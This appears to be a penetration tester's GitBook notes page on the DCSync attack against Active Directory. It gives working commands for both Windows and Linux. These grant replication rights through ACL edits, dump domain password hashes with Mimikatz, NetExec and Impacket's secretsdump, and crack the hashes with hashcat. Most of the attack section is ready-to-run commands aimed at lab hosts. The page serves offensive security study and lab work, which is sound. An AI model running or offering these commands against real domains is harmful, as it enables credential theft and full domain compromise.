---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# DCSync

## Concept

AD environments often use multiple DCs for redundancy. These DCs synchronize using **Directory Replication Service Remote Protocol (DRSR)**. **DCSync** is a late-phase attack that allows an attacker to **impersonate a DC** and then dump `ntds.dit`.

> _DCs do **not verify the source** of a replication request. They only check that the **Security Identifier (SID)** used has appropriate privileges._

To perform this attack, we must have control over an account that has the rights to perform domain replication, aka **DCSync rights**:

1. `Replicating Directory Changes`
2. `Replicating Directory Changes All`
3. `Replication-Get-Changes-In-Filtered-Set` (sometimes)

These rights are **granted by default** to `Domain Admins`, `Enterprise Admins`, and `Administrators`.

> _If we have **`WriteDacl`** rights over an account, we can assign **DCSync rights** to it. For instance, the `Windows Exchange Permissions`_ _group has **DCSync rights**. For an example of a DCSync attack using the `WriteDacl` permission see_ [_Forest_](../../../boxes/easy/forest.md#privilege-escalation)_._

## Attack

{% tabs %}
{% tab title="Windows" %}
We can enumerate permissions using an elevated CMD or PS session.

```powershell
# Command Prompt
dsacls "DC=domain,DC=local"
# PowerShell
Get-DomainObjectAcl -Identity <USER> -Domain domain.local -ResolveGUIDs
```

We can assign DCSync rights manually or automatically using [PowerView](../../../tools/active-directory/powerview.md) or `DCSync.py`.

> _The manual way is explained_ [_here_](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)_._

{% code overflow="wrap" %}
```powershell
# Manually
$acl = get-acl "ad:DC=domain,DC=local"
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
# rightsGuid for the extended right Ds-Replication-Get-Changes-All
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
# rightsGuid for the extended right Ds-Replication-Get-Changes
$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=domain,DC=local"

# PowerView
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity <USER> -Rights DCSync
```
{% endcode %}

Once the rights have been assigned, we can perform the attack with [`mimikatz`](../../../tools/active-directory/mimikatz.md).

```powershell
# Mimikatz (PS script)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\administrator"'
# Mimikatz (binary)
mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:administrator
```

Finally, we can crack the hash using [`hashcat`](../../../tools/passwords/hashcat.md) on our attacking machine.

{% code overflow="wrap" %}
```bash
hashcat -m 1000 hashes.dcsync rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
{% endtab %}

{% tab title="Linux" %}


We can assign DCSync rights using `DCSync.py`.

{% code overflow="wrap" %}
```bash
# DCSync.py
DCSync.py -dc domain.local -t 'CN=<USER>,CN=Users,DC=domain,DC=local' 'domain.local\<USER>:<PASS>'
```
{% endcode %}

We can also perform the attack with [`NetExec`](dcsync.md#netexec) or [Impacket](../../../tools/active-directory/impacket.md)'s `secretsdump` script.

```bash
# NetExec
nxc smb 10.10.10.161 -u '<USER>' -p '<PASS>' --ntds --user administrator

# Impacket's secretsdump
impacket-secretsdump htb.local/hacker@10.10.10.161 -just-dc-user administrator
```

> _For an example of a DCSync attack using `DCSync.py` and `secretsdump.py` see_ [_here_](https://x7331.gitbook.io/boxes/boxes/boxes/easy/active#eop-via-kerberoasting)_. For an example of a DCSync attack using NetExec see_ [_here_](https://x7331.gitbook.io/boxes/boxes/boxes/easy/sauna#dcsync-attack)_._

Finally, we can crack the hash using [`hashcat`](../../../tools/passwords/hashcat.md) on our attacking machine.

{% code overflow="wrap" %}
```bash
hashcat -m 1000 hashes.dcsync rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="DCSync" %}
{% embed url="https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection" %}
A great article about the DCSync attack.
{% endembed %}
{% endtab %}

{% tab title="Secretsump" %}
{% embed url="https://www.youtube.com/watch?v=QfyZQDyeXjQ" %}
How Secretsdump script work behind the scenes!
{% endembed %}
{% endtab %}

{% tab title="dsacls" %}
{% embed url="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)" %}
{% endtab %}
{% endtabs %}
